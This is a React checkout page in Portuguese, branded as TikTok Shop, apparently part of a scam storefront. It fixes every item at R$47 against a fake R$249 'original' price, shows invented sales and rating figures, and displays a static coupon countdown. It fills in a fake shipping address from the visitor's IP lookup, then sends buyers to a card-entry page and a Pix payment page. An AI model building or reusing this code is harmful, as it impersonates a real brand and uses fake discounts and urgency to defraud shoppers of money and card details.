"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  ShieldCheck, 
  Star, 
  Zap, 
  CheckCircle2, 
  ChevronUp,
  Plus,
  Minus,
  Ticket
} from 'lucide-react';
import { Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [locationStr, setLocationStr] = useState("Carregando localização...");
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    } else if (!location.state?.cardAdded) {
      navigate('/');
    }

    if (location.state?.cardAdded) {
      setCardData(location.state.cardData);
    }

    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        setLocationStr(`${data.org?.split(' ')[0] || "Bairro"}, ${data.city} - ${data.region_code}`);
      })
      .catch(() => setLocationStr("Centro, São Paulo - SP"));
  }, [location, navigate]);

  if (!product) return null;

  // Valores reais
  const unitPrice = 47.00;
  const originalUnitPrice = 249.00;
  const subtotal = unitPrice * quantity;
  const originalSubtotal = originalUnitPrice * quantity;
  const discountTotal = originalSubtotal - subtotal;
  const finalTotal = subtotal - couponAmount;

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[120px]">
      <div className="bg-white border-b h-14 flex flex-col items-center justify-center sticky top-0 z-50 px-4">
        <div className="w-full flex items-center relative">
          <button onClick={() => navigate(-1)} className="absolute left-0">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <div className="w-full text-center">
            <h1 className="text-[17px] font-bold text-gray-900">Resumo do Pedido</h1>
            <div className="flex items-center justify-center text-[#00BFA5] text-[10px] mt-0.5">
              <ShieldCheck size={12} className="mr-1 fill-[#00BFA5]/10" />
              <span>Seus dados estão seguros conosco</span>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto">
        <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
          <div className="flex items-center space-x-2">
            <MapPin size={18} className="text-gray-900" />
            <div>
              <span className="text-[14px] text-gray-900 font-medium">Endereço de envio</span>
              <p className="text-[12px] text-gray-400 font-normal">{locationStr}</p>
            </div>
          </div>
          <button className="text-[#FF2C55] text-[14px] font-medium">+ Adicionar endereço</button>
        </div>

        <div className="bg-white mt-3 p-4">
          <div className="flex justify-between items-center mb-2">
            <h3 className="text-[13px] font-bold text-gray-900">MAIS MAKE BRASIL</h3>
            <button className="flex items-center text-[12px] text-gray-400" onClick={() => setIsNoteDrawerOpen(true)}>
              {orderNote ? <span className="truncate max-w-[100px] mr-1">{orderNote}</span> : "Adicionar nota"}
              <ChevronRight size={14} className="ml-1" />
            </button>
          </div>

          <div className="flex items-center space-x-1 mb-3">
            <span className="text-[12px] text-[#FF2C55]">★</span>
            <span className="text-[11px] text-[#FF2C55] font-medium">
              Melhor escolha! 28.0K vendido(s) e com nota 4.8/5,0
            </span>
          </div>

          <div className="flex space-x-3">
            <div className="w-[88px] h-[88px] rounded-lg overflow-hidden bg-gray-50 flex-shrink-0">
              <img src={product.media[0].src} className="w-full h-full object-contain" alt="Produto" />
            </div>
            <div className="flex-grow flex flex-col justify-between">
              <div>
                <h4 className="text-[13px] text-gray-900 line-clamp-2 leading-snug mb-1">{product.title}</h4>
                <div className="flex flex-col space-y-1 mb-1.5">
                  <div className="bg-[#FFF1F3] text-[#FF2C55] text-[9px] font-bold px-1.5 py-0.5 rounded-sm flex items-center w-fit">
                    <Zap size={10} className="mr-0.5 fill-[#FF2C55]" /> Oferta Relâmpago
                  </div>
                  <div className="bg-[#FFF9E6] text-[#FFA800] text-[9px] font-bold px-1.5 py-0.5 rounded-sm flex items-center w-fit">
                    <CheckCircle2 size={10} className="mr-0.5" /> Devolução gratuita
                  </div>
                </div>
              </div>

              <div className="flex justify-between items-end">
                <div className="flex flex-col">
                  <div className="flex items-center space-x-1">
                    <span className="text-[16px] font-bold text-[#FF2C55]">R$ {unitPrice.toFixed(2).replace('.', ',')}</span>
                    <Ticket size={14} className="text-[#FF2C55] fill-[#FF2C55]" />
                  </div>
                  <span className="text-[11px] text-gray-400 line-through">R$ {originalUnitPrice.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex items-center bg-[#F1F1F1] rounded-sm h-7">
                  <button className="w-8 flex items-center justify-center text-gray-500" onClick={() => setQuantity(q => Math.max(1, q - 1))}><Minus size={14} /></button>
                  <span className="w-8 text-center text-[13px] font-medium border-x border-white">{quantity}</span>
                  <button className="w-8 flex items-center justify-center text-gray-500" onClick={() => setQuantity(q => q + 1)}><Plus size={14} /></button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white mt-3 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
          <div className="flex items-center space-x-2">
            <Ticket size={20} className="text-[#FF2C55] rotate-[-10deg]" />
            <span className="text-[14px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center text-[#FF2C55] space-x-1">
            <span className="text-[13px] font-medium">- R$ {couponAmount.toFixed(2).replace('.', ',')}</span>
            <ChevronRight size={16} className="text-gray-300" />
          </div>
        </div>

        <div className="bg-white mt-3 p-4">
          <h3 className="text-[15px] font-bold text-gray-900 mb-4">Resumo do Pedido</h3>
          <div className="space-y-3.5">
            <div className="flex justify-between items-center">
              <div className="flex items-center space-x-1.5">
                <span className="text-[14px] text-gray-900 font-bold">Subtotal do produto</span>
                <ChevronUp size={16} className="text-gray-900" />
              </div>
              <span className="text-[14px] font-bold text-gray-900">R$ {subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="flex justify-between items-center pl-4 text-[13px]">
              <span className="text-gray-500">Preço original</span>
              <span className="text-gray-900">R$ {originalSubtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="flex justify-between items-center pl-4 text-[13px]">
              <span className="text-gray-500">Desconto no produto</span>
              <span className="text-[#FF2C55]">- R$ {discountTotal.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="flex justify-between items-center pl-4 text-[13px]">
              <span className="text-gray-500">Cupons do TikTok Shop</span>
              <span className="text-[#FF2C55]">- R$ {couponAmount.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="pt-2 flex flex-col items-end">
              <div className="flex items-center space-x-4 w-full justify-between">
                <span className="text-[16px] font-bold text-gray-900">Total</span>
                <span className="text-[16px] font-bold text-gray-900">R$ {finalTotal.toFixed(2).replace('.', ',')}</span>
              </div>
              <span className="text-[11px] text-gray-400 mt-0.5">Impostos inclusos</span>
            </div>
          </div>
        </div>

        <div className="bg-white mt-3 p-4">
          <h3 className="text-[15px] font-bold text-gray-900 mb-4">Forma de pagamento</h3>
          <div className="flex items-center justify-between cursor-pointer" onClick={() => navigate('/adicionar-cartao')}>
            <div className="flex items-center space-x-3">
              {cardData ? (
                <img src={cardData.brand === 'visa' ? "https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" : "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"} className="h-4" />
              ) : (
                <div className="bg-gray-50 p-1 rounded-sm border"><Plus size={14} className="text-gray-400" /></div>
              )}
              <span className="text-[14px] text-gray-900 font-medium">
                {cardData ? `Cartão terminado em ${cardData.last4}` : "Cartão de crédito"}
              </span>
            </div>
            <ChevronRight size={18} className="text-gray-300" />
          </div>
        </div>

        <div className="bg-[#FFF1F3] p-3 flex items-center space-x-2 mt-3 mb-4">
          <span className="text-[14px]">😊</span>
          <span className="text-[12px] text-[#FF2C55] font-medium">Você está economizando R$ {(discountTotal + couponAmount).toFixed(2).replace('.', ',')} nesse pedido.</span>
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-2">
            <span className="text-[15px] font-bold text-gray-900">Total ({quantity} item)</span>
            <span className="text-[18px] font-bold text-[#FF2C55]">R$ {finalTotal.toFixed(2).replace('.', ',')}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[54px] flex flex-col justify-center border-none"
            onClick={() => navigate('/pix-pagamento', { state: { product } })}
          >
            <span className="text-[16px] leading-none">Fazer pedido</span>
            <span className="text-[10px] font-medium opacity-90 mt-1">O cupom expira em 02:43:46</span>
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;